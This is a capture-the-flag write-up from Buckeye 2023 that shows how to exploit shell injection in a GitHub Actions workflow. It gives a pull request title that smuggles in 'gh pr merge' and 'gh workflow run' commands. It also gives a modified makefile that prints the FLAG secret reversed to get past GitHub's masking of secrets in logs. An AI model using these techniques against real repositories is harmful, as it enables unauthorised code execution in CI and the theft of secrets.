# Buckeye CTF
These are write-ups for Buckeye 2023 CTF

## smederij
This CTF primarily works through exploiting shell injection with github actions.
### goal of the exploit
What we want to do is leak the flag from build.yaml, but we do not have access to the repository in order to run actions. The only thing we can do is make pull requests to the repository, which run `label.yaml`.
### the exploit
In the first pass, github replaces certain locations in `label.yaml` with the name of the pull request. This is basic text replacement with no sanitization, so we can name our pull request in a way that injects the commands to merge our pull request and run a build action. Because `label.yaml` runs `gh` commands directly, we know it has the ability to use the `gh` command to merge the pull request automatically.
The next step is to leak the flag during the build process. This is done through the makefile, reversing the $FLAG variable before we print it to get around githubs automatic filter on printing secrets in build scripts.
### final pull request
the title of the pull request was
```
update"; gh pr merge <PR number> --merge; gh workflow run build.yaml; "
```
I also changed the makefile:
```sh
CC=gcc
CFLAGS=-I.

smith.o: smith.c
	echo "${FLAG}" | rev
	$(CC) -c -o $@ $< $(CFLAGS) -DFLAG='"${FLAG}"'

smith: smith.o
	$(CC) -o $@ smith.o $(CFLAGS)

.PHONY: clean

clean:
	rm smith *.o
```
Make the pull request, unreverse the output of the build that happens, and then you have the flag.